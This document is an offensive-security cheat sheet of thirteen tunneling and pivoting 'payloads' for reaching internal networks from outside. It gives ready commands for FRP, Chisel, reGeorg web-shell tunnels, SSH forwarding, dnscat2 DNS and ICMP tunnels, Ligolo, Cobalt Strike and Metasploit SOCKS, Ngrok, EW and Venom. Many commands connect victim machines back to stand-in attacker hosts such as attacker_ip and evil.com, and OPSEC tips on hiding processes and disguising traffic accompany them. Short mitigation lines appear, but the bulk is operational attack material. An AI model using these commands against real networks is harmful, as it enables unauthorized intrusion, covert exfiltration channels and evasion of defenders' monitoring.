# Tunneling and Proxying

_13 intranet payloads_

### FRP intranet tunneling  `tunnel-frp`
_Use FRP to establish an intranet tunnel_
Subclass: **TCP tunnel** · tags: `frp` `tunnel` `proxy` `nat`

**Prerequisites:**
- Public-facing server
- Intranet machine can reach the internet
- FRP tool

**Attack chain:**

**Server configuration**
> FRP server configuration file frps.ini
_platform: linux_
```
[common]
bind_port = 7000
```
**Syntax breakdown:**
- `bind_port` — server listening port _parameter_

**Client configuration**
> FRP client configuration file frpc.ini
_platform: windows_
```
[common]
server_addr = attacker_ip
server_port = 7000

[rdp]
type = tcp
local_ip = 127.0.0.1
local_port = 3389
remote_port = 3389
```
**Syntax breakdown:**
- `server_addr` — server IP _parameter_
- `local_port` — local port _parameter_
- `remote_port` — remote port _parameter_

**Start the server**
> Start the FRP server
_platform: linux_
```
./frps -c frps.ini
```

**Start the client**
> Start the FRP client
_platform: windows_
```
frpc.exe -c frpc.ini
```

**Analysis:** FRP can establish a TCP tunnel, mapping an intranet service out to the internet.

**OPSEC tips:**
- FRP traffic may be detected
- Consider using encrypted transport
- Take care to hide the process

**Overview:** FRP is a high-performance reverse-proxy application that can expose intranet services to the internet.

**Vulnerability principle:** When an intranet machine can reach the internet, an attacker can build a tunnel to map intranet services outward.

**Exploitation method:** Exploitation flow: 1) Deploy the FRP server on a public-facing server; 2) Run the FRP client on the intranet machine; 3) Establish the tunnel connection; 4) Access intranet services through the tunnel.

**Mitigations:** Mitigations: 1) Monitor abnormal outbound traffic; 2) Restrict outbound connections; 3) Deploy traffic-analysis appliances; 4) Prohibit unauthorized proxy tools.

---

### Chisel intranet tunneling  `tunnel-chisel`
_Use Chisel to establish an intranet tunnel_
Subclass: **HTTP tunnel** · tags: `chisel` `tunnel` `proxy` `http`

**Prerequisites:**
- Public-facing server
- Intranet machine can reach the internet
- Chisel tool

**Attack chain:**

**Server**
> Start the Chisel server
_platform: linux_
```
./chisel server -p 8000 --reverse
```
**Syntax breakdown:**
- `chisel server` — Chisel server mode _command_
- `-p 8000` — listening port _parameter_
- `--reverse` — allow reverse tunnels _parameter_

**Reverse SOCKS**
> Establish a reverse SOCKS proxy
_platform: windows_
```
chisel.exe client attacker_ip:8000 R:socks
```

**Port forwarding**
> Port forwarding
_platform: windows_
```
chisel.exe client attacker_ip:8000 R:3389:127.0.0.1:3389
```

**Analysis:** Chisel can establish an HTTP tunnel and pierce through firewalls.

**OPSEC tips:**
- Chisel uses the HTTP protocol
- Can bind a domain for disguise
- Traffic is encrypted

**Overview:** Chisel is a fast TCP/UDP tunneling tool that transports over HTTP.

**Vulnerability principle:** An HTTP tunnel can bypass firewall restrictions and expose intranet services outward.

**Exploitation method:** Exploitation flow: 1) Run the Chisel server on a public-facing server; 2) Run the Chisel client on the intranet machine; 3) Establish the tunnel; 4) Access the intranet through the proxy.

**Mitigations:** Mitigations: 1) Monitor abnormal HTTP traffic; 2) Detect long-lived connections; 3) Deploy traffic analysis.

---

### ReGeorg tunnel  `tunnel-regeorg`
_Establish a tunnel through a web shell_
Subclass: **ReGeorg** · tags: `tunnel` `regeorg` `proxy`

**Prerequisites:**
- Web shell upload
- A supported scripting language

**Attack chain:**

**Upload the tunnel script**
> Upload the tunnel script for the corresponding language
```
Upload tunnel.aspx/tunnel.jsp/tunnel.php to the target web server
```

**Establish the tunnel**
> Start the SOCKS proxy
_platform: linux_
```
python reGeorgSocksProxy.py -p 1080 -u http://target/tunnel.aspx
```
**Syntax breakdown:**
- `-p 1080` — local listening port _parameter_
- `-u http://target/tunnel.aspx` — tunnel script URL _parameter_

**Configure the proxy**
> Scan through the proxy
_platform: linux_
```
proxychains nmap -sT -Pn target
```

**Overview:** ReGeorg establishes a SOCKS proxy tunnel through a web shell.

**Vulnerability principle:** The web server allows uploading and executing scripts.

**Exploitation method:** Exploitation flow: 1) Upload the tunnel script 2) Establish the tunnel 3) Access through the proxy

**Mitigations:** Mitigations: 1) Restrict file uploads 2) Monitor abnormal requests

---

### SSH local forwarding  `tunnel-ssh-local`
_SSH local port forwarding_
Subclass: **SSH** · tags: `ssh` `tunnel` `local`

**Prerequisites:**
- SSH access

**Attack chain:**

**Local forwarding**
> Map the target's port 80 to local port 8080
_platform: linux_
```
ssh -L 8080:target:80 user@jump
```
**Syntax breakdown:**
- `-L 8080:target:80` — local forwarding: local 8080 -> target:80 _parameter_
- `user@jump` — SSH jump host _value_

**Overview:** SSH local forwarding can map a remote port to the local machine.

**Vulnerability principle:** SSH access allows establishing a tunnel.

**Exploitation method:** Exploitation flow: 1) Establish the SSH connection 2) Configure forwarding 3) Access the local port

**Mitigations:** Mitigations: 1) Restrict SSH port forwarding 2) Monitor SSH connections

---

### SSH remote forwarding  `tunnel-ssh-remote`
_SSH remote port forwarding_
Subclass: **SSH** · tags: `ssh` `tunnel` `remote`

**Prerequisites:**
- SSH access

**Attack chain:**

**Remote forwarding**
> Map local port 80 to remote port 8080
_platform: linux_
```
ssh -R 8080:localhost:80 user@jump
```
**Syntax breakdown:**
- `-R 8080:localhost:80` — remote forwarding: remote 8080 -> local 80 _parameter_
- `user@jump` — SSH jump host _value_

**Overview:** SSH remote forwarding can expose a local port to a remote host.

**Vulnerability principle:** SSH access allows establishing a reverse tunnel.

**Exploitation method:** Exploitation flow: 1) Establish the SSH connection 2) Configure reverse forwarding 3) Access from the remote host

**Mitigations:** Mitigations: 1) Restrict SSH port forwarding 2) GatewayPorts no

---

### SSH dynamic forwarding  `tunnel-ssh-dynamic`
_SSH dynamic SOCKS proxy_
Subclass: **SSH** · tags: `ssh` `tunnel` `socks`

**Prerequisites:**
- SSH access

**Attack chain:**

**Dynamic forwarding**
> Create a SOCKS proxy
_platform: linux_
```
ssh -D 1080 user@jump
```
**Syntax breakdown:**
- `-D 1080` — dynamic forwarding, creates a SOCKS5 proxy _parameter_
- `user@jump` — SSH jump host _value_

**Use the proxy**
> Access through the SOCKS proxy
_platform: linux_
```
proxychains nmap -sT -Pn target
```

**Overview:** SSH dynamic forwarding creates a SOCKS proxy that can reach arbitrary targets.

**Vulnerability principle:** SSH access allows establishing a SOCKS proxy.

**Exploitation method:** Exploitation flow: 1) Establish the SSH connection 2) Create the SOCKS proxy 3) Access through the proxy

**Mitigations:** Mitigations: 1) Restrict SSH port forwarding 2) Monitor SSH connections

---

### DNS tunnel  `tunnel-dns`
_Establish a tunnel over the DNS protocol_
Subclass: **DNS** · tags: `dns` `tunnel` `covert`

**Prerequisites:**
- DNS resolution capability
- A controllable domain

**Attack chain:**

**Using dnscat2**
> Start the dnscat2 server
_platform: linux_
```
ruby dnscat2.rb evil.com --dns port=53,domain=evil.com
```

**Client connection**
> Client connects to the server
_platform: windows_
```
dnscat2-v0.07-client-win32.exe --dns domain=evil.com --secret SECRET
```

**Establish the tunnel**
> Establish a SOCKS tunnel
_platform: linux_
```
session -i 1
listen 127.0.0.1:1080 10.0.0.1:1080
```

**Overview:** DNS tunneling uses the DNS protocol to transport data and bypass firewalls.

**Vulnerability principle:** DNS is usually allowed through firewalls.

**Exploitation method:** Exploitation flow: 1) Configure the domain 2) Start the server 3) Client connects

**Mitigations:** Mitigations: 1) Restrict DNS queries 2) Monitor abnormal DNS traffic

---

### ICMP tunnel  `tunnel-icmp`
_Establish a tunnel over the ICMP protocol_
Subclass: **ICMP** · tags: `icmp` `tunnel` `covert`

**Prerequisites:**
- ICMP is allowed through
- Administrator privileges

**Attack chain:**

**Using icmptunnel**
> Start the server
_platform: linux_
```
icmptunnel -s 10.0.0.1
```

**Client connection**
> Client connects
_platform: linux_
```
icmptunnel -c attacker.com
```

**Overview:** ICMP tunneling uses ICMP Echo packets to transport data.

**Vulnerability principle:** ICMP is usually allowed through firewalls.

**Exploitation method:** Exploitation flow: 1) Start the server 2) Client connects 3) Establish the tunnel

**Mitigations:** Mitigations: 1) Restrict ICMP 2) Monitor abnormal ICMP traffic

---

### Ligolo tunnel  `tunnel-ligolo`
_Ligolo intranet tunneling tool_
Subclass: **Ligolo** · tags: `ligolo` `tunnel` `proxy`

**Prerequisites:**
- Ability to execute the agent program

**Attack chain:**

**Start the server**
> Start the Ligolo proxy service
_platform: linux_
```
sudo proxy -selfcert
```

**Run the agent**
> Run the agent on the target machine
_platform: windows_
```
agent.exe -connect attacker:11601 -ignore-cert
```

**Create the tunnel**
> Create the tunnel interface
_platform: linux_
```
session
start
```

**Overview:** Ligolo is a modern intranet tunneling tool with multi-platform support.

**Vulnerability principle:** The agent program can be run on the target machine.

**Exploitation method:** Exploitation flow: 1) Start the server 2) Run the agent 3) Create the tunnel

**Mitigations:** Mitigations: 1) Monitor abnormal processes 2) Restrict outbound connections

---

### SOCKS proxy  `socks-proxy`
_Establish a SOCKS proxy to access the intranet_
Subclass: **SOCKS** · tags: `socks` `proxy` `tunnel`

**Prerequisites:**
- An existing intranet access point

**Attack chain:**

**SSH SOCKS proxy**
> SSH dynamic port forwarding
_platform: linux_
```
ssh -D 1080 user@jumpserver
or
ssh -D 1080 -N -f user@jumpserver
```
**Syntax breakdown:**
- `-D 1080` — local SOCKS proxy port _parameter_
- `-N` — do not execute a remote command _parameter_
- `-f` — run in the background _parameter_

**ProxyChains configuration**
> Configure ProxyChains
_platform: linux_
```
Edit /etc/proxychains.conf:
[ProxyList]
socks5 127.0.0.1 1080

Usage:
proxychains nmap -sT target
```

**Cobalt Strike SOCKS**
> CS SOCKS proxy
_platform: windows_
```
beacon> socks 1080
Start a SOCKS proxy in CS
```

**Metasploit SOCKS**
> MSF SOCKS proxy
_platform: linux_
```
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run
```

**Overview:** A SOCKS proxy can pivot into the intranet to reach more resources.

**Vulnerability principle:** An accessible intranet entry point exists.

**Exploitation method:** Exploitation flow: 1) Obtain a jump host 2) Establish a SOCKS proxy 3) Access the intranet

**Mitigations:** Mitigations: 1) Network segmentation 2) Monitor abnormal connections 3) Restrict outbound traffic

---

### Ngrok intranet tunneling  `tunnel-ngrok`
_Use Ngrok to establish intranet tunneling_
Subclass: **Ngrok** · tags: `ngrok` `tunnel` `penetration`

**Prerequisites:**
- Ngrok account
- Internet access

**Attack chain:**

**Install Ngrok**
> Install and configure Ngrok
```
Download: https://ngrok.com/download
tar -xvzf ngrok.zip
./ngrok authtoken YOUR_TOKEN
```

**HTTP tunnel**
> Create an HTTP tunnel
```
./ngrok http 80
Map local port 80 to the internet
```

**TCP tunnel**
> Create a TCP tunnel
```
./ngrok tcp 3389
Map local port 3389 to the internet
```
**Syntax breakdown:**
- `http` — HTTP-protocol tunnel _keyword_
- `tcp` — TCP-protocol tunnel _keyword_

**Custom domain**
> Use a custom domain
```
./ngrok http -hostname=custom.domain.com 80
```

**Overview:** Ngrok can expose intranet services to the internet.

**Vulnerability principle:** The intranet can reach the internet.

**Exploitation method:** Exploitation flow: 1) Install Ngrok 2) Create the tunnel 3) Access intranet services

**Mitigations:** Mitigations: 1) Monitor outbound connections 2) Restrict Ngrok domains 3) Network segmentation

---

### EW intranet tunneling  `tunnel-ew`
_Use EW to establish intranet tunneling_
Subclass: **EW** · tags: `ew` `tunnel` `socks`

**Prerequisites:**
- An existing intranet access point

**Attack chain:**

**Forward proxy**
> Forward SOCKS proxy
_platform: linux_
```
./ew -s ssocksd -l 1080
Start a SOCKS proxy on the jump host
```
**Syntax breakdown:**
- `-s ssocksd` — SOCKS service mode _parameter_
- `-l 1080` — listening port _parameter_

**Reverse proxy**
> Reverse SOCKS proxy
_platform: linux_
```
Attacker machine: ./ew -s rcsocks -l 1080 -e 8888
Jump host: ./ew -s rssocks -d attacker_ip -e 8888
```

**Multi-level chaining**
> Multi-level chaining
_platform: linux_
```
./ew -s lcx_tran -l 1080 -f 2nd_hop -g 9999
Multi-hop jump-host tunneling
```

**Overview:** EW is a lightweight intranet tunneling tool.

**Vulnerability principle:** An accessible intranet jump host exists.

**Exploitation method:** Exploitation flow: 1) Upload EW 2) Establish the tunnel 3) Access the intranet

**Mitigations:** Mitigations: 1) Monitor abnormal processes 2) Network segmentation 3) Restrict outbound traffic

---

### Venom intranet tunneling  `tunnel-venom`
_Use Venom to establish intranet tunneling_
Subclass: **Venom** · tags: `venom` `tunnel` `socks`

**Prerequisites:**
- An existing intranet access point

**Attack chain:**

**Start the server**
> Start the server
_platform: linux_
```
./venom_server -lport 9999
Start the server on the attacker machine
```

**Connect the client**
> Connect to the server
```
./venom_client -rhost attacker_ip -rport 9999
Connect to the server from the jump host
```
**Syntax breakdown:**
- `-rhost` — server IP _parameter_
- `-rport` — server port _parameter_

**Establish SOCKS**
> Establish a SOCKS proxy
```
 Venom > socks 1080
Establish a SOCKS proxy
```

**Port forwarding**
> Port forwarding
```
Venom > lforward 127.0.0.1 3389 13389
Forward intranet 3389 to local 13389
```

**Overview:** Venom supports multi-level proxying and SOCKS.

**Vulnerability principle:** An accessible intranet jump host exists.

**Exploitation method:** Exploitation flow: 1) Start the server 2) Connect the client 3) Establish the proxy

**Mitigations:** Mitigations: 1) Monitor abnormal processes 2) Network segmentation 3) Restrict outbound traffic

---
